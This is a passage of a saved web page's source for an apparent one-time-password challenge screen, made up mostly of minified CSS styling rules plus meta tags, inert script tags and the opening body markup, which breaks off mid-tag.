.r88SAGjUrMc-{visibility:hidden}._51c-BF0XNyo-[data-variant=filled]{background-color:var(--component-Button-filled-bgColor-rest);color:var(--fgColor-inverted)}._51c-BF0XNyo-[data-variant=filled]:not(:disabled):hover{background-color:var(--component-Button-filled-bgColor-hover);box-shadow:var(--shadow-hover);color:var(--fgColor-inverted)}._51c-BF0XNyo-[data-variant=filled]:not(:disabled):active{background-color:var(--component-Button-filled-bgColor-active)}._51c-BF0XNyo-[data-variant=filled]:not(:disabled):focus-visible{box-shadow:var(--shadow-focusOuter)}._51c-BF0XNyo-[data-variant=filled]:disabled{opacity:.65}._51c-BF0XNyo-[data-variant=filled][aria-disabled=true]{background-color:var(--component-Button-filled-bgColor-invalid);color:var(--fgColor-default)}._51c-BF0XNyo-[data-variant=text]{background-color:var(--bgColor-default);color:var(--fgColor-variant)}._51c-BF0XNyo-[data-variant=text] .r88SAGjUrMc-:after{border-bottom:var(--borderSize-underline) solid var(--fgColor-variant)}._51c-BF0XNyo-[data-variant=text]:not(:disabled):hover{background-color:var(--bgColor-state-hover)}._51c-BF0XNyo-[data-variant=text]:not(:disabled):active{background-color:var(--bgColor-state-active)}._51c-BF0XNyo-[data-variant=text]:not(:disabled):focus-visible{box-shadow:var(--shadow-focus)}._51c-BF0XNyo-[data-variant=text]:disabled,._51c-BF0XNyo-[data-variant=text][aria-disabled=true]{opacity:.65}.YI3GMQn4Xo4-{white-space:normal}.nQChUFhlcL0-{align-items:center;animation:fadeIn .15s ease-in-out;display:none;inset:0;justify-content:center;position:absolute}.nQChUFhlcL0- svg{height:var(--sizing-icon-L);width:var(--sizing-icon-L)}.r88SAGjUrMc-{position:relative}.r88SAGjUrMc-:after{bottom:calc(var(--borderSize-underline)*-1);content:&quot;&quot;;left:0;position:absolute;right:0}.gQIlCC1ijQ0-{font-size:var(--fontSize-L);font-weight:400}.gQIlCC1ijQ0-,.mnmfEEsQ8Bw-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;letter-spacing:0;line-height:1.17}.mnmfEEsQ8Bw-{font-size:var(--fontSize-3XL);font-weight:600}.Vxvq0OQ2EoE-{align-items:center;display:flex;flex-direction:column;gap:var(--gap-content-L);max-width:min(100%,370px)}@media (max-height:350px){.Vxvq0OQ2EoE-{display:none}}.mnmfEEsQ8Bw-{min-height:30.42px}.mnmfEEsQ8Bw-:focus-visible span{position:relative}.mnmfEEsQ8Bw-:focus-visible span:after{border-bottom:var(--borderSize-focus) solid var(--borderColor-focus);bottom:calc(var(--borderSize-focus)*-1);content:&quot;&quot;;left:0;position:absolute;right:0}.gQIlCC1ijQ0-{color:var(--fgColor-subtle);max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.psnZoCxGFCw-{height:100%;overflow:hidden;padding-left:calc(var(--app-padding-horizontal) - var(--app-padding-content));padding-right:calc(var(--app-padding-horizontal)/2)}.psnZoCxGFCw->*{-webkit-overflow-scrolling:touch;max-height:100%;overflow-x:hidden;overflow-y:overlay;overflow-y:auto;padding:var(--app-padding-content);padding-bottom:var(--app-padding-horizontal);padding-right:calc(var(--app-padding-horizontal)/2);width:100%}.psnZoCxGFCw-.n9F0CdBAfu0- .MRDe6--z-b4-{align-content:center;display:grid;grid-template-rows:minmax(min(70%,var(--layout-content-body-heightMin,250px)),min-content)}.Wx-8BLcX9K8-{align-items:center;display:flex;flex-direction:column;gap:var(--gap-content-L);height:100%;padding-bottom:var(--app-padding-vertical)}.MRDe6--z-b4-{flex:1;justify-items:center;width:100%}.MRDe6--z-b4- .EVWKyPP5QhM-{margin:0 auto;max-width:370px;width:100%}.ygiljn2Fltk-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-L);font-weight:400;letter-spacing:0;line-height:1.17}._4GslC32h7t4-{--layout-content-body-heightMin:300px}.yOayUK20NFY-{display:flex;flex-direction:column;gap:var(--gap-content-L)}.ZltiRLOD-V0-{max-height:var(--component-Error-icon-L);max-width:var(--component-Error-icon-L);min-height:var(--component-Error-icon-L);min-width:var(--component-Error-icon-L)}.ZltiRLOD-V0- svg{height:100%;width:100%}.ZltiRLOD-V0- svg path{fill:var(--fgColor-default)}.wWsj0PVtEQA-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-2XL);font-weight:600;letter-spacing:0;line-height:1.17}.wWsj0PVtEQA-:focus-visible span{position:relative}.wWsj0PVtEQA-:focus-visible span:after{border-bottom:var(--borderSize-focus) solid var(--borderColor-focus);bottom:calc(var(--borderSize-focus)*-1);content:&quot;&quot;;left:0;position:absolute;right:0}@media (max-height:220px){.wWsj0PVtEQA-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-L);font-weight:700;letter-spacing:0;line-height:1.17}}.ygiljn2Fltk-{align-self:flex-start;display:flex;flex-direction:column;gap:var(--gap-content-L);text-align:left}.ygiljn2Fltk- ul>li{list-style-type:disc;margin-left:calc(var(--fontSize-L) + 5px)}.wzMJZ2Px0G4-{color:var(--fgColor-subtle);font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-S);font-weight:400;letter-spacing:0;line-height:1.17}.wzMJZ2Px0G4- dd,.wzMJZ2Px0G4- dt{display:inline-block}.wzMJZ2Px0G4- dt:after{content:&quot;:&quot;/&quot;&quot;}.wzMJZ2Px0G4- dd{margin-left:2px}.x-l2qNWa1E4-{border-radius:999px;display:inline-flex;height:var(--sizing-icon-L);width:var(--sizing-icon-L)}.x-l2qNWa1E4- svg{height:100%;width:100%}.x-l2qNWa1E4- svg path{fill:var(--fgColor-variant)}.x-l2qNWa1E4-:not(:disabled):hover{background-color:var(--bgColor-state-hover)}.x-l2qNWa1E4-:not(:disabled):active{background-color:var(--bgColor-state-active)}.x-l2qNWa1E4-:not(:disabled):focus-visible{box-shadow:var(--shadow-focus)}.x-l2qNWa1E4-:disabled{opacity:.65}.uC7xYvh--Xs-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-S);font-weight:500;letter-spacing:0;line-height:1.17}.aqQESjmaOX4-{--checkbox--border-color:transparent;--checkbox--border-color--inset:transparent;--checkbox__icon--background-color:var(--bgColor-elevated);align-items:center;column-gap:var(--spacing-2XS);display:flex;overflow-wrap:break-word;position:relative;user-select:none}.aqQESjmaOX4-._1u7rGpnE5jc-{opacity:.65}.aqQESjmaOX4-:not(._1u7rGpnE5jc-){cursor:pointer}.V6skmM0T4Pw-{left:-10000px;opacity:0;position:absolute;top:-10000px}.V6skmM0T4Pw-:checked+.O47GuDMP1fc- svg{display:block}.V6skmM0T4Pw-:not(:disabled):hover+.O47GuDMP1fc-{--checkbox__icon--background-color:var(--bgColor-state-hover)}.V6skmM0T4Pw-:not(:disabled):active+.O47GuDMP1fc-{--checkbox__icon--background-color:var(--bgColor-state-active)}.V6skmM0T4Pw-:not(:disabled):focus-visible+.O47GuDMP1fc-{box-shadow:var(--shadow-focus)}.V6skmM0T4Pw-:not(:disabled)[aria-invalid=true]+.O47GuDMP1fc-{box-shadow:var(--shadow-danger)}.V6skmM0T4Pw-:not(:disabled)[aria-invalid=true]:focus-visible+.O47GuDMP1fc-{box-shadow:var(--shadow-dangerFocus)}.O47GuDMP1fc-{align-items:center;background-color:var(--checkbox__icon--background-color);border-radius:4px;box-shadow:var(--shadow-form-rest);display:flex;justify-content:center;max-height:var(--sizing-icon-L);max-width:var(--sizing-icon-L);min-height:var(--sizing-icon-L);min-width:var(--sizing-icon-L);overflow:hidden;position:relative}.O47GuDMP1fc- svg{display:none;height:100%;width:100%}.O47GuDMP1fc- svg path{fill:var(--fgColor-default)}.kJX4J5ET2tU-{white-space:pre-line}.uC7xYvh--Xs-{color:var(--fgColor-subtle);min-height:var(--font-body-S-Medium-lineHeight)}.uC7xYvh--Xs-.LHtHq0YKVQc-{color:var(--fgColor-status-danger)}.O-WEVYodQxk-{align-items:center;color:var(--fgColor-subtle);column-gap:var(--spacing-5XS);display:flex;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-S);font-weight:400;letter-spacing:0;line-height:1.17;min-height:var(--font-body-S-Regular-lineHeight)}.O-WEVYodQxk-.vAX-M-XLRmU-{animation:hKOVrvlrNyM- .1s ease-in-out;color:var(--fgColor-status-danger)}._4yy7UdCkorM-{height:16px;width:16px}._4yy7UdCkorM- svg{height:100%;width:100%}._4yy7UdCkorM- svg path{fill:var(--fgColor-status-danger)}@keyframes hKOVrvlrNyM-{0%{transform:translate(-5px)}50%{transform:translate(5px)}}.LjMplB63EGw-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-S);font-weight:500;letter-spacing:0;line-height:1.17}.GNz71gQyPvA-{align-items:center;display:flex}.LjMplB63EGw-{display:flex;flex:1;flex-direction:column;gap:var(--spacing-6XS)}.MVZForHXWo8-{margin:auto}.PkHuufjVKn0- button{margin-left:var(--spacing-5XS);vertical-align:top}.BV2eSwAQqzI-{display:inline;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-XL);font-weight:600;letter-spacing:0;line-height:1.17;position:relative}.BV2eSwAQqzI-:focus-visible span{position:relative}.BV2eSwAQqzI-:focus-visible span:after{border-bottom:var(--borderSize-focus) solid var(--borderColor-focus);bottom:calc(var(--borderSize-focus)*-1);content:&quot;&quot;;left:0;position:absolute;right:0}.RpJ0-pH-TEA-{display:flex;flex-direction:column;height:100%}.RpJ0-pH-TEA-.NCKQZeLJkEY- ._7TdtAC7XcJY-{border-bottom:1px solid var(--component-Document-borderColor-body);border-top:1px solid var(--component-Document-borderColor-body)}.RpJ0-pH-TEA-.NCKQZeLJkEY- ._7TdtAC7XcJY-.TUWSUv-VxLw-{border-bottom:0}.rJ-2SnanReE-{display:flex;justify-content:center;padding:var(--app-padding-vertical) var(--app-padding-horizontal)}._7TdtAC7XcJY-{flex:1;min-height:0;overflow:hidden;position:relative}.a5niCr7EXvQ-{display:flex;flex-direction:column;padding:var(--app-padding-vertical) var(--app-padding-horizontal);row-gap:var(--spacing-2XS)}.J8XtnYIthwI-{display:grid;gap:var(--spacing-2XS);width:100%}.xq6VwqhIUcA-{display:flex;flex-direction:column;gap:var(--spacing-2XS)}.-VqgfgA-PM8-{width:100%}.rVScLiHSivE- path{fill:var(--fgColor-subtle)!important}.UYh3LmRkFsQ-{display:flex;justify-content:flex-end}._7oerspXqXOQ-{left:-10000px;overflow:hidden;position:absolute;top:-10000px}.HT9iAiythgk- a{color:var(--fgColor-link-rest);text-decoration:underline}.HT9iAiythgk- a:disabled{opacity:.65;text-decoration:none}.HT9iAiythgk- a:not(:disabled):hover{color:var(--fgColor-link-hover)}.HT9iAiythgk- a:not(:disabled):active{color:var(--fgColor-link-active)}.HT9iAiythgk- a:not(:disabled):focus-visible{box-shadow:var(--shadow-focusOuter)}.HT9iAiythgk-{display:flex;flex-direction:column;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-M);font-weight:400;gap:var(--spacing-3XS);letter-spacing:0;line-height:1.17;padding:0 var(--spacing-4XS);text-align:left}.HT9iAiythgk- h1,.HT9iAiythgk- h2,.HT9iAiythgk- h3{font-weight:700}.ZAioVgKWRow-{align-items:center;column-gap:var(--spacing-5XS);display:grid;grid-template-columns:1fr 1fr 1fr;justify-items:center;width:100%}.G8shSgs5IKg-{display:flex;gap:var(--spacing-5XS);justify-self:flex-start}.fBreEf-MC78-{justify-self:flex-end}.Z5zGSuSeqd8-{animation:_7Ns-2HFPy90- 1s linear infinite}.Z5zGSuSeqd8- path:first-child{fill:var(--fgColor-inverted)}.Z5zGSuSeqd8- path:last-child{fill:var(--fgColor-default)}@keyframes _7Ns-2HFPy90-{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.wusScEQUSmA-{background-color:#fbfbfb;color-scheme:light;inset:0;position:absolute}.wusScEQUSmA->*{-webkit-overflow-scrolling:touch;max-height:100%;overflow:auto;padding:var(--app-padding-content);width:100%}._431O-2CvO8E-{border:1px solid #ccd1cc;margin:8px auto}._431O-2CvO8E-.h-9wbO7USuw- .uosEeKyUoUw-{display:block}._431O-2CvO8E-.h-9wbO7USuw- .w-GK1A9h4ME-{display:none}.uosEeKyUoUw-{display:none;height:100%;width:100%}.uosEeKyUoUw-.T4Ytw7LI20E-{display:block}.w-GK1A9h4ME-{align-items:center;display:flex;height:100%;justify-content:center;width:100%}.rXbPzV0eAxs-{background-color:#fbfbfb;color:#000;color-scheme:light;font-family:Courier New,Courier,monospace;font-size:var(--fontSize-M);font-weight:400;inset:0;letter-spacing:0;line-height:1.17;overflow-wrap:break-word;position:absolute;white-space:pre-wrap}.rXbPzV0eAxs->*{-webkit-overflow-scrolling:touch;max-height:100%;overflow:auto;padding:var(--app-padding-content);width:100%}.nFrC7RWLemk-{background-color:#fbfbfb;color-scheme:light}.nFrC7RWLemk-,.nFrC7RWLemk- iframe{height:100%;width:100%}.OSLMckmYHXk- dt{font-size:var(--fontSize-S);font-weight:600}.OSLMckmYHXk-,.OSLMckmYHXk- dt{font-family:-apple-system,BlinkMacSystemFont,sans-serif;letter-spacing:0;line-height:1.17}.OSLMckmYHXk-{display:flex;flex-direction:column;font-size:var(--fontSize-M);font-weight:400;gap:var(--spacing-4XS)}.OSLMckmYHXk-._8eJCsOQoP1g-{flex-direction:row;flex-wrap:wrap}.OSLMckmYHXk->*{display:flex;flex-direction:column}.OSLMckmYHXk- dd{overflow-wrap:break-word;white-space:pre-wrap}.o3N66VE3IXA-{font-family:Courier New,Courier,monospace}.rvBZacaL1ew-{display:flex;flex-direction:column;font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-M);font-weight:500;gap:var(--gap-content-L);height:100%;letter-spacing:0;line-height:1.17;padding:var(--app-padding-content) var(--app-padding-horizontal) var(--app-padding-vertical)}._11uTrxLUD1w-{align-self:center}.byJ5RclJtw0-{margin:auto}.byJ5RclJtw0- p{max-width:370px}._6R9H-jnhXVw-{background-color:#fbfbfb;border:1px solid var(--borderColor-muted);border-radius:var(--borderRadius-2XS);color-scheme:light;flex:1;min-height:0;overflow:hidden}._6R9H-jnhXVw- iframe{height:100%;width:100%}.SQc7FRHdxDM-{align-items:center;display:flex;gap:var(--spacing-2XS);justify-content:center}@media (min-height:400px){.SQc7FRHdxDM-{flex-direction:column}}.jHE35ol-txs-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-M);font-weight:500;letter-spacing:0;line-height:1.17}.jHE35ol-txs-,.lJfxc91Mc5g-{align-items:flex-start;display:flex;flex-direction:column;gap:var(--spacing-S)}.FQi4GK2-lUY-{gap:var(--spacing-4XS)}.FQi4GK2-lUY-,._2Y9gb9VE4Sw-{display:flex;flex-direction:column}._2Y9gb9VE4Sw-{align-items:center;gap:var(--spacing-2XS);justify-content:center;width:100%}.anTr2FfT0NI-{align-items:start;display:flex;justify-content:center}.anTr2FfT0NI- svg{width:80px}@media (max-height:220px){.anTr2FfT0NI- svg{width:60px}}.O5xZsmVjdmo-{height:100%;width:100%}.xdexl2z-LoQ-{position:relative}._5N17V2ww3jg-,.xdexl2z-LoQ-{height:100%;min-height:0}._5N17V2ww3jg->*{min-height:0}._5N17V2ww3jg-.Egz-6tQfUP0-{animation:_8BxCijtBIVE- .25s;opacity:0}._5N17V2ww3jg-.Egz-6tQfUP0-.paGyLFx5jnE-{animation:IBFs4gN3SiA- .25s}._5N17V2ww3jg-.BYA7jRrPgL0-{animation:i20UD-d-7Gk- .25s;inset:0;opacity:1;position:absolute}._5N17V2ww3jg-.BYA7jRrPgL0-.paGyLFx5jnE-{animation:Z9vEFEJpbSA- .25s}@keyframes i20UD-d-7Gk-{0%{opacity:0;transform:translateX(100%)}to{opacity:1;transform:translateX(0)}}@keyframes Z9vEFEJpbSA-{0%{opacity:0;transform:translateX(-100%)}to{opacity:1;transform:translateX(0)}}@keyframes _8BxCijtBIVE-{0%{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(-100%)}}@keyframes IBFs4gN3SiA-{0%{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(100%)}}.LmmgN5ikR3o- h1{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-L);font-weight:500;letter-spacing:0;line-height:1.17}._3fA6A-7fXZE-{align-items:center;background:none;display:flex;height:100%;inset:0;justify-content:center;max-height:100%;max-width:100%;overflow:hidden;position:absolute;width:100%;z-index:1}._3fA6A-7fXZE-::backdrop{backdrop-filter:blur(2px);background:var(--bgColor-backdrop-rest);border-radius:var(--app-borderRadius-L)}._3fA6A-7fXZE-::backdrop{animation:fadeIn .15s ease-in-out}._3fA6A-7fXZE-[data-type=dialog] ._3lPhkxGJnvI-{animation:fadeInUp .15s ease-in-out;margin:var(--app-padding-horizontal) var(--app-padding-horizontal) var(--spacing-M);max-height:90vh;max-width:370px;width:100%}._3fA6A-7fXZE-[data-type=side]{justify-content:flex-end}._3fA6A-7fXZE-[data-type=side] ._3lPhkxGJnvI-{animation:fadeInLeft .15s ease-in-out;height:100%;margin:0;max-width:90vw}._3lPhkxGJnvI-{background:var(--bgColor-default);border:0 solid hsla(0,0%,100%,0);border-radius:var(--app-borderRadius-L);color:var(--fgColor-default);display:flex;flex-direction:column;overflow-y:auto}.LmmgN5ikR3o-{align-items:center;display:grid;grid-template-columns:1fr auto 1fr;justify-content:space-between;padding:var(--spacing-S) var(--app-padding-horizontal) var(--app-padding-vertical)}.LmmgN5ikR3o- h1{grid-column:2;justify-self:center;max-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.LmmgN5ikR3o- h1,.LmmgN5ikR3o- h1:focus span{position:relative}.LmmgN5ikR3o- h1:focus span:after{border-bottom:var(--borderSize-focus) solid var(--borderColor-focus);bottom:calc(var(--borderSize-focus)*-1);bottom:0;content:&quot;&quot;;left:0;position:absolute;right:0}.fMj-Z2ZDLp4-{display:flex;flex:1;flex-direction:column;padding:var(--app-padding-content) calc(var(--app-padding-horizontal)/2) var(--spacing-M) calc(var(--app-padding-horizontal) - var(--app-padding-content))}.v8RDIJt8Oe4-{grid-column:3;justify-self:flex-end}.k-QdFJHIaW0-{animation:fadeInUp .25s ease-in-out;inset:0;position:absolute}.xBoUtclVXV8- ._40xXfzBIVkQ-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-L);font-weight:500;letter-spacing:0;line-height:1.17}.XNL5gPae4Uc- .BgBOvZkYUjY-{font-size:var(--fontSize-2XL)}.XNL5gPae4Uc- .BgBOvZkYUjY-,.XNL5gPae4Uc- .M63JvmMcJdA-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-weight:600;letter-spacing:0;line-height:1.17}.XNL5gPae4Uc- .M63JvmMcJdA-{font-size:var(--component-OtpChallenge-fontSize-L)}.wjTH1MDT4RA-{--idle-screen__spinner--size:60px;align-items:center;display:flex;flex-direction:column;max-width:372px;row-gap:var(--spacing-S)}@media (max-height:370px){.wjTH1MDT4RA-{--idle-screen__spinner--size:48px}}@media (min-height:351px){.wjTH1MDT4RA-{height:100%}}@media (max-height:350px){.wjTH1MDT4RA-{--idle-screen__spinner--size:40px}}@media (max-height:220px){.wjTH1MDT4RA-{--idle-screen__spinner--size:24px}}.XNL5gPae4Uc-{overflow-wrap:break-word;text-align:center}.XNL5gPae4Uc- .M63JvmMcJdA-{text-align:center;text-transform:uppercase}.OgdyOiyqLtw-{align-items:center;display:flex;max-height:var(--component-OtpChallenge-spinner);max-width:var(--component-OtpChallenge-spinner);min-height:var(--component-OtpChallenge-spinner);min-width:var(--component-OtpChallenge-spinner)}.OgdyOiyqLtw- svg{height:100%;width:100%}.xBoUtclVXV8- ._40xXfzBIVkQ-{color:var(--fgColor-subtle);overflow-wrap:break-word;vertical-align:top;white-space:pre-wrap}.Zqju6MWJEKE-{align-items:flex-end;display:flex;flex:1}.WWBIBwSqNBo-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-S);font-weight:500;letter-spacing:0;line-height:1.17}.o7iMNxHzUoo-{display:flex;flex-direction:column;gap:var(--gap-content-L)}.o7iMNxHzUoo- button{width:100%}.WWBIBwSqNBo-{align-items:center;background-color:var(--bgColor-variant);border-radius:4px;display:flex;justify-content:center;padding:var(--spacing-5XS) var(--spacing-4XS);text-align:center}.TPr-LzAHs-o-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-L);font-weight:500;letter-spacing:0;line-height:1.17}.sif3XlD5G8Q-{margin-bottom:var(--gap-content-L)}.OTOKyYPqj3k-{align-items:center;display:flex;flex-direction:column;height:100%}.Myz8qSdgxUk-{background-color:var(--bgColor-elevated);border-radius:4px;display:flex;gap:var(--spacing-5XS);max-width:min(370px,100% - var(--app-padding-horizontal) * 2);min-width:0;padding:var(--spacing-5XS);width:100%}.TPr-LzAHs-o-{border-radius:4px;color:var(--fgColor-default);display:inline-flex;flex:1;justify-content:center;min-width:0;padding:var(--spacing-3XS) var(--spacing-5XS)}.TPr-LzAHs-o- span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.TPr-LzAHs-o-:not(:disabled):hover{background-color:var(--bgColor-state-hover)}.TPr-LzAHs-o-:not(:disabled):active{background-color:var(--bgColor-state-active)}.TPr-LzAHs-o-:not(:disabled):focus-visible{box-shadow:var(--shadow-focus)}.TPr-LzAHs-o-:disabled{opacity:.65}.TPr-LzAHs-o-[aria-selected=true]{background-color:var(--component-Button-filled-bgColor-rest);color:var(--fgColor-inverted)}.TPr-LzAHs-o-[aria-selected=true]:not(:disabled):hover{background-color:var(--component-Button-filled-bgColor-hover)}.TPr-LzAHs-o-[aria-selected=true]:not(:disabled):active{background-color:var(--component-Button-filled-bgColor-active)}.dpGb4q3I-3o-{flex:1;min-height:0;position:relative;width:100%}.dpGb4q3I-3o->*{height:100%;overflow:hidden;padding-left:calc(var(--app-padding-horizontal) - var(--app-padding-content));padding-right:calc(var(--app-padding-horizontal)/2)}.dpGb4q3I-3o->*>*{-webkit-overflow-scrolling:touch;max-height:100%;overflow-x:hidden;overflow-y:overlay;overflow-y:auto;padding:var(--app-padding-content);padding-bottom:var(--app-padding-horizontal);padding-right:calc(var(--app-padding-horizontal)/2);width:100%}.ITTDLM3eX9o-{margin:auto;max-width:370px}.ITTDLM3eX9o-[hidden]{display:none}.xqv-UG9j2oU-{padding-top:calc(var(--gap-content-L) - var(--app-padding-content))}.XRXA6h5GwDc- input{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-L);font-weight:500;letter-spacing:0;line-height:1.17}.XRXA6h5GwDc-{align-items:center;background-color:var(--bgColor-elevated);border-radius:8px;box-shadow:var(--shadow-form-rest);column-gap:var(--spacing-3XS);display:inline-flex;height:var(--sizing-interactive-L);padding:0 var(--spacing-2XS);width:100%}.XRXA6h5GwDc-:not(.n3Q8baMIPFw-):hover{background-color:var(--bgColor-state-hover)}.XRXA6h5GwDc-:not(.n3Q8baMIPFw-):focus-within{box-shadow:var(--shadow-focus)}.XRXA6h5GwDc-:not(.n3Q8baMIPFw-).gnvAI2tA6Dk-{box-shadow:var(--shadow-danger)}.XRXA6h5GwDc-:not(.n3Q8baMIPFw-).gnvAI2tA6Dk-:focus-within{box-shadow:var(--shadow-dangerFocus)}.XRXA6h5GwDc-.n3Q8baMIPFw-{opacity:.65}.XRXA6h5GwDc- input{color:var(--fgColor-default);height:100%;width:100%}.XRXA6h5GwDc- input::placeholder{color:var(--fgColor-subtle);font-weight:400}.O8Hq-HXUN94-{align-items:center;display:flex;max-height:var(--sizing-icon-L);max-width:var(--sizing-icon-L);min-height:var(--sizing-icon-L);min-width:var(--sizing-icon-L)}.O8Hq-HXUN94- svg{height:100%;width:100%}.O8Hq-HXUN94-._38e0Vm2Pdzc- path{fill:var(--fgColor-default)}.RIzWALAwQpE-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-S);font-weight:400;letter-spacing:0;line-height:1.17}.POW8Ph7ezLk-,._3xhtiEY02a8-{display:flex;height:100%}._3xhtiEY02a8-{flex-direction:column;gap:var(--gap-content-L);margin:auto;max-height:285px;max-width:320px;width:100%}@media (max-height:350px){._3xhtiEY02a8-{height:auto;max-height:none}}@media (max-height:370px){._3xhtiEY02a8-[data-type=multi]{align-items:center;display:grid;grid-template:&quot;label label&quot; &quot;input primary&quot; &quot;message message&quot; &quot;secondary secondary&quot;;grid-template-columns:1fr min-content;max-width:360px}}@media (max-height:350px){._3xhtiEY02a8-:not([data-type]){align-items:center;display:grid;grid-template:&quot;label label&quot; &quot;input primary&quot; &quot;message message&quot; &quot;secondary secondary&quot;;grid-template-columns:1fr min-content;max-width:360px}}@media (max-height:220px){._3xhtiEY02a8-{max-width:320px}}.uG-jygrzU5o-{grid-area:label;margin:auto;width:100%}._3ymYwI67AgE-{grid-area:input;row-gap:var(--gap-content-L)}.RIzWALAwQpE-,._3ymYwI67AgE-{display:flex;flex-direction:column;margin:auto;width:100%}.RIzWALAwQpE-{grid-area:message;row-gap:var(--spacing-6XS)}.wYFiIb2D2kg-{align-items:flex-end;display:flex;flex:1;grid-area:primary;justify-content:center}.wrWVaStRIL4-{align-items:center;align-self:center;display:flex;grid-area:secondary;justify-self:center}._6OWmyKuo2aU- path{fill:var(--fgColor-variant)!important}.-F8132tus0k- path{fill:var(--fgColor-status-success)!important}._9lQu6t1At8c- path{fill:var(--fgColor-status-danger)!important}.Q86SUYICXzo-{display:flex;flex-direction:column;row-gap:var(--gap-content-L)}@media (max-height:220px){.Q86SUYICXzo-{row-gap:0}.Q86SUYICXzo->*{height:32px}.Q86SUYICXzo->:first-child{border-bottom-left-radius:0;border-bottom-right-radius:0}.Q86SUYICXzo->:nth-child(2){border-top-left-radius:0;border-top-right-radius:0}}.L4qSd1qL-ys-{display:flex;flex-direction:column;row-gap:var(--spacing-2XS)}._1TKPDefMxG8-{width:100%}.PvXppXPZQlg-{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-size:var(--fontSize-XL);font-weight:600;letter-spacing:0;line-height:1.17}.rfWV0QGd1sM-{display:flex;flex-direction:column;gap:var(--spacing-5XS)}._48Yu6ovoNdg-{inset:0;position:absolute}.Lua4ap2uGkQ-{position:relative}.Lua4ap2uGkQ-,.vvASmnh6XfQ-{height:100%;width:100%}.owHJ6Q-avyo-,.svNm7yQX9bk-{inset:0;position:absolute}</style><meta name=&quot;viewport&quot; content=&quot;initial-scale=1.0&quot;><meta charset=&quot;iso-8859-1&quot;><script bis_use=&quot;true&quot; data-savepage-type=&quot;text/javascript&quot; data-savepage-type=&quot;text/plain&quot; type=&quot;text/plain&quot; charset=&quot;utf-8&quot; nonce=&quot;&quot; data-dynamic-id=&quot;e0549669-e628-4c0a-ac8a-66896a6fc7fd&quot; data-savepage-src=&quot;chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/200.js&quot;></script><script data-savepage-type=&quot;&quot; data-savepage-type=&quot;text/plain&quot; type=&quot;text/plain&quot; data-savepage-src=&quot;data:text/javascript;base64,&quot;></script>
<style id=&quot;savepage-cssvariables&quot;>
  :root {
  }
</style>
                        
<style id=&quot;savepage-cssvariables&quot;>
  :root {
  }
</style>
                        </head><body __processed_6db07d4a-e9db-4676-bd80-d8effce8c159__=&quot;true&quot; bis_status=&quot;ok&quot; bis_frame_id=&quot;182&quot; bis_body_id=&quot;fr_kwbocykyp4cbwjrd3dyq2i&quot; bis_depth=&quot;0&quot; bis_chainid=&quot;1&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:450,&amp;quot;h&amp;quot;:520,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}&quot;><div id=&quot;app&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:450,&amp;quot;h&amp;quot;:520,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}&quot;><div class=&quot;Lua4ap2uGkQ-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:450,&amp;quot;h&amp;quot;:520,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}&quot;><div class=&quot;O5xZsmVjdmo-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:450,&amp;quot;h&amp;quot;:520,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}&quot;><div class=&quot;AZhftGJX1fQ-&quot; data-viewport=&quot;otpChallenge&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:450,&amp;quot;h&amp;quot;:520,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}&quot;><div class=&quot;AFP4hM8sct4-&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:1,&amp;quot;y&amp;quot;:1,&amp;quot;w&amp;quot;:448,&amp;quot;h&amp;quot;:57,&amp;quot;abs_x&amp;quot;:635,&amp;quot;abs_y&amp;quot;:88}&quot;><header class=&quot;_9z1U54gUQEg-&quot; data-has-back=&quot;false&quot; bis_size=&quot;{&amp;quot;x&amp;quot;:17,&amp;quot;y&amp;quot;:1,&amp;quot;w&amp;quot;:416,&amp;quot;h&amp;quot;:57,&amp;quot;abs_x&amp;quot;:651,&amp;quot;abs_y&amp;quot;:88}&quot;><div class=&quot;Nv0kK8uGeS0-&quot; 